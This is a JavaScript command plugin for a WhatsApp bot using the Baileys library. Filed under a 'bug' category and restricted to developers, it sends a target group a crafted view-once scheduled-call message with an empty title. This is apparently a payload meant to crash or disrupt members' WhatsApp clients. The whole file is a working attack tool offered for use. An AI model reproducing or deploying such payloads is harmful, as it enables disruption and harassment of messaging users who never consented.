const {
proto,
prepareWAMessageMedia,
generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

exports.run = {
usage: ['call'],
use: 'id group',
category: 'bug',
async: async (m, { func, anya }) => {
if (!m.text) return m.reply(func.example(m.cmd, '120363345038124642@g.us'))
let from = m.args[0] && /^\d{18}@g\.us$/.test(m.args[0]) ? m.args[0] : null;
if (!from) return anya.sendReact(m.chat, '❌', m.key)
let etc = generateWAMessageFromContent(from,
proto.Message.fromObject({
viewOnceMessage: {
message: {
scheduledCallCreationMessage: {
scheduledTimestampMs: Date.now(),
callType: 2,
title: ""
}
}
},
}), {
userJid: from
}
);
anya.relayMessage(from, etc.message, {});
anya.sendReact(m.chat, '✅', m.key)
},
devs: true
}